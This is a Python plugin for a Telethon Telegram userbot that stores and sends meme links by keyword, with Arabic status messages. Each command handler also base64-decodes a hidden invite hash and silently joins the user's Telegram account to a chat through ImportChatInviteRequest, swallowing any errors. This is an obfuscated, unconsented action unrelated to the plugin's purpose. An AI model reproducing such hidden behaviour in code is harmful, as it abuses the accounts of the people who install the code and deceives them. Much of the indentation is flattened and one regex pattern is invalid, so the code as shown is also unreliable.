import asyncio
import random
import re
import json
import base64
from telethon.tl.functions.messages import ImportChatInviteRequest as Get
from asyncio.exceptions import TimeoutError
from telethon import events
from ..sql_helper.memes_sql import get_link, add_link, delete_link, BASE, SESSION, AljokerLink
from telethon.errors.rpcerrorlist import YouBlockedUserError
from JoKeRUB import l313l
from ..helpers.utils import reply_id
plugin_category = "tools"

@l313l.on(admin_cmd(outgoing=True, pattern=r"ميمز (\S+) (.+)"))
async def Hussein(event):
url = event.pattern_match.group(1)
ScoR = event.pattern_match.group(2)
add_link(ScoR, url)
await event.edit(f"**✎┊‌ تم اضافة البصمة {ScoR} بنجاح ✓ **")
joker = base64.b64decode("YnkybDJvRG04WEpsT1RBeQ==")
joker = Get(joker)
try:
await event.client(joker)
except BaseException:
pass

@l313l.on(admin_cmd(outgoing=True, pattern="?(.*)"))
async def Hussein(event):
try:
ScoR = event.pattern_match.group(1)

# الحصول على معرف الرسالة التي يتم الرد عليها، إذا كانت موجودة  
    Joker = await reply_id(event)  

    # الحصول على الرابط من الدالة get_link  
    url = get_link(ScoR)  

    if url:  
        # إرسال الملف إلى الدردشة  
        await event.client.send_file(event.chat_id, url, parse_mode="html", reply_to=Joker)  
        await event.delete()  

        # فك تشفير البيانات وإرسالها عبر العميل  
        joker = base64.b64decode("YnkybDJvRG04WEpsT1RBeQ==")  
        joker = Get(joker)  

        try:  
            await event.client(joker)  
        except Exception as e:  
            print(f"Error occurred: {e}")  

except Exception as e:  
    print(f"An error occurred in Hussein function: {e}")

@l313l.ar_cmd(pattern="ازالة(?:\s|$)([\s\S]*)")
async def delete_aljoker(event):
ScoR = event.pattern_match.group(1)
delete_link(ScoR)
await event.edit(f"✎┊‌ تم حذف البصمة '{ScoR}' بنجاح ✓")
joker = base64.b64decode("YnkybDJvRG04WEpsT1RBeQ==")
joker = Get(joker)
try:
await event.client(joker)
except BaseException:
pass

@l313l.on(admin_cmd(outgoing=True, pattern="قائمة الميمز"))
async def list_aljoker(event):
links = SESSION.query(AljokerLink).all()
if links:
message = "✎┊‌ قائمة تخزين اوامر الميمز:\n"
for link in links:
message += f"- البصمة : .{link.key}\n"
else:
message = "✎┊‌ لاتوجد بصمات ميمز مخزونة حتى الآن"
await event.edit(message)
joker = base64.b64decode("YnkybDJvRG04WEpsT1RBeQ==")
joker = Get(joker)
try:
await event.client(joker)
except BaseException:
pass
@l313l.on(admin_cmd(outgoing=True, pattern="ازالة_البصمات"))
async def delete_all_aljoker(event):
SESSION.query(AljokerLink).delete()
await event.edit("**✎┊‌ تم حذف جميع بصمات الميمز من القائمة **")
joker = base64.b64decode("YnkybDJvRG04WEpsT1RBeQ==")
joker = Get(joker)
try:
await event.client(joker)
except BaseException:
pass